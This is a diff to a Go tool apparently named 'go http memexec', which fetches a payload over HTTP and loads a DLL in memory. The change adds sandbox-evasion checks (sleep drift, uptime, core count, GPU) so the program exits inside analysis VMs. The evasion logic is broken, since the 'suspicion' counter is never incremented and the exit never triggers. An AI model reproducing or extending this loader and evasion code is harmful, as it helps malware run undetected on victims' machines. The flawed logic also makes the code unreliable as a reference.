@@ -8,6 +8,8 @@ import (
 	"gohttpmem/pkg/vm"
 	"io"
 	"net/http"
+	"os"
+	"runtime"
 	"strings"
 	"syscall"
 	"time"
@@ -16,15 +18,17 @@ import (
 const (
 	// Default URL to download from if none provided, configure this before build to point to your payload to avoid passing CLI flags on run
 	defaultDownloadURL = ""
-
-	projectName = "go http memexec"
-	version     = "1.0.0"
 )
 
 func main() {
-	// check if inside vm 
+	// check if inside vm
 
-	if isVM, _ := vm.IsVM(); isVM {
+	var suspicion int = 0
+	vm.CheckSleepDrift()
+	vm.CheckUptime()
+	vm.CheckCoreCount()
+	vm.CheckGPU()
+	if suspicion > 2 {
 		runtime.GC()
 		os.Exit(0)
 	}
@@ -111,7 +115,6 @@ func main() {
 		fmt.Printf("DLL loaded successfully at address: 0x%X\n", dllHandle)
 
 		// Store the entry point for later DLL_PROCESS_DETACH
-
 
 		// Try to call an exported procedure if requested by ordinal or name
 		if *ordinalPtr >= 0 {
